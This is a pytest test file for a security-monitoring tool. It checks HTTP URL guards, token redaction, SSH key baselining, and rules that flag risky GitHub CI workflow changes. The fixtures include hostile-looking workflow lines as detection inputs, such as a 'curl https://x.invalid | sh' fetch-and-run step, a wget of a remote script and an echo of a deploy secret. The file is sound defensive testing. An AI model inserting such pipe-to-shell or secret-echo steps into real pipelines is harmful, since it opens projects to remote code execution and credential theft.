"""HTTP client guards, GitHub collector parsing, R2/R8. No network: fake transport only."""

import json
from datetime import UTC, datetime, timedelta
from pathlib import Path
from typing import Any

import pytest

from sentinel.correlation.engine import correlate
from sentinel.correlation.model import Context
from sentinel.sources.github import GitHubCollector, added_line_flags
from sentinel.sources.http import HttpClient, HttpError, Response
from sentinel.store.db import Store

NOW = datetime(2026, 10, 27, 12, 0, tzinfo=UTC)
TOKEN = "test-token-" + "x" * 20  # fake value for redaction checks


class FakeTransport:
    def __init__(
        self, routes: dict[str, Any], statuses: dict[str, list[int]] | None = None
    ) -> None:
        self.routes = routes
        self.statuses = statuses or {}
        self.calls: list[str] = []

    def send(
        self, method: str, url: str, headers: dict[str, str], body: bytes | None, timeout: float
    ) -> Response:
        self.calls.append(url)
        queue = self.statuses.get(url)
        if queue:
            return Response(queue.pop(0), {}, b"")
        for prefix, payload in self.routes.items():
            if url.startswith(prefix):
                return Response(200, {}, json.dumps(payload).encode())
        return Response(404, {}, b"")


# http guards -------------------------------------------------------------------------
@pytest.mark.parametrize(
    "url",
    [
        "http://api.github.com/user",
        "https://evil.example.com/x",
        "https://apikeys.googleapis.com/v2/projects/p/locations/global/keys/k/keyString",
        "https://apikeys.googleapis.com/v2/projects/p/locations/global/keys/k:getKeyString",
    ],
)
def test_client_refuses_disallowed_urls(url: str) -> None:
    transport = FakeTransport({})
    with pytest.raises(HttpError):
        HttpClient(transport).get(url)
    assert transport.calls == []  # refused before any request


def test_retry_then_error_never_contains_token_or_query() -> None:
    url = "https://api.github.com/user?token=" + TOKEN
    transport = FakeTransport({}, {url: [503, 503, 401]})
    sleeps: list[float] = []
    with pytest.raises(HttpError) as exc:
        HttpClient(transport, retries=3, sleep=sleeps.append).get(url, {"Authorization": TOKEN})
    assert exc.value.status == 401 and len(sleeps) == 2
    assert TOKEN not in str(exc.value) and "token=" not in str(exc.value)


# github collector --------------------------------------------------------------------
def test_added_line_flags_ignore_removed_and_context_lines() -> None:
    patch = "@@\n-run: curl http://old\n context\n+run: echo ${{ secrets.DEPLOY }}\n"
    assert added_line_flags(patch) == {"adds_network": False, "adds_secret_ref": True}
    assert added_line_flags("+  run: wget https://x.invalid/a.sh")["adds_network"] is True


def collector(routes: dict[str, Any]) -> GitHubCollector:
    return GitHubCollector(HttpClient(FakeTransport(routes)), TOKEN, b"k" * 32)


def test_ssh_keys_first_run_is_baseline_then_diff(tmp_path: Path) -> None:
    store = Store(tmp_path / "s.db")
    routes = {
        "https://api.github.com/user/keys": [
            {"id": 1, "created_at": "2026-01-01T00:00:00Z", "key": "ssh-ed25519 AAAA"}
        ],
        "https://api.github.com/user": {"login": "octo"},
    }
    assert collector(routes).collect_user_keys(store, NOW) == []
    routes["https://api.github.com/user/keys"] = [
        {"id": 1, "created_at": "2026-01-01T00:00:00Z", "key": "ssh-ed25519 AAAA"},
        {"id": 2, "created_at": "2026-10-27T11:00:00Z", "key": "ssh-ed25519 BBBB"},
    ]
    [event] = collector(routes).collect_user_keys(store, NOW)
    assert event["event_type"] == "ssh_key_added" and event["attributes"]["key_id"] == "2"
    assert "AAAA" not in json.dumps(event) and "BBBB" not in json.dumps(
        event
    )  # key bodies not kept
    assert event["identity_ref"].startswith("user-fp-")


def repo_routes(author: str, patch: str, release_at: str | None) -> dict[str, Any]:
    base = "https://api.github.com/repos/o/r"
    commit = {
        "sha": "abc",
        "author": {"login": author},
        "commit": {"author": {"date": "2026-10-27T10:00:00Z"}},
    }
    old = {
        "sha": "old",
        "author": {"login": "maint"},
        "commit": {"author": {"date": "2026-09-01T10:00:00Z"}},
    }
    routes: dict[str, Any] = {
        f"{base}/commits?path=": [commit],
        f"{base}/commits/abc": {
            "files": [{"filename": ".github/workflows/ci.yml", "patch": patch}]
        },
        f"{base}/commits?since=": [commit, old],
        f"{base}/releases": [],
    }
    if release_at:
        routes[f"{base}/releases"] = [
            {"id": 9, "published_at": release_at, "tag_name": "v1", "author": {"login": author}}
        ]
    return routes


def test_r2_fires_for_non_maintainer_adding_network(tmp_path: Path) -> None:
    store = Store(tmp_path / "s.db")
    events = collector(
        repo_routes("stranger", "+  run: curl https://x.invalid | sh", None)
    ).collect_repo(store, "o/r", NOW, timedelta(days=7))
    [change] = events
    assert change["attributes"]["actor_is_maintainer"] is False
    [m] = correlate(events, Context())
    assert (m.rule_id, m.severity_floor) == ("R2", "high")


def test_r2_quiet_for_maintainer(tmp_path: Path) -> None:
    store = Store(tmp_path / "s.db")
    events = collector(repo_routes("maint", "+  run: curl https://x.invalid", None)).collect_repo(
        store, "o/r", NOW, timedelta(days=7)
    )
    assert correlate(events, Context()) == []


def test_r8_release_within_window_and_near_miss(tmp_path: Path) -> None:
    store = Store(tmp_path / "a.db")
    events = collector(repo_routes("maint", "+ name: ci", "2026-10-27T20:00:00Z")).collect_repo(
        store, "o/r", NOW, timedelta(days=7)
    )
    assert [m.rule_id for m in correlate(events, Context())] == ["R8"]
    late = collector(repo_routes("maint", "+ name: ci", "2026-10-29T20:00:00Z")).collect_repo(
        Store(tmp_path / "b.db"), "o/r", NOW, timedelta(days=7)
    )
    assert correlate(late, Context()) == []


def test_repo_cursor_advances(tmp_path: Path) -> None:
    store = Store(tmp_path / "s.db")
    collector(repo_routes("maint", "", None)).collect_repo(store, "o/r", NOW, timedelta(days=7))
    assert store.get_doc("cursors", "github:o/r") == {"since": "2026-10-27T12:00:00Z"}
